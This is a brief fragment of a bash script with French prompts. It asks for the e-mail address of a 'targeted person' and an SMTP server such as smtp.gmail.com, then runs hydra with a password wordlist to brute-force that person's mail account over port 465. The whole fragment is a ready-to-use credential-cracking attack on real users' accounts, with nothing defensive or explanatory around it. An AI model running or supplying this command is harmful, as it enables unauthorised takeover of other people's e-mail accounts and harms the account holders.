...
echo -e -n "$MAGENTA [>]$CYAN Entrez l'E-mail de la personne ciblée : $DEFAULT"
read email
...
echo -e -n "$MAGENTA [>]$CYAN Entrez le nom du serveur utilisé (smtp.gmail.com) : $DEFAULT"
read serveur




hydra -S -I -l $email -P $wordlist -vV -e ns -s 465 $serveur smtp
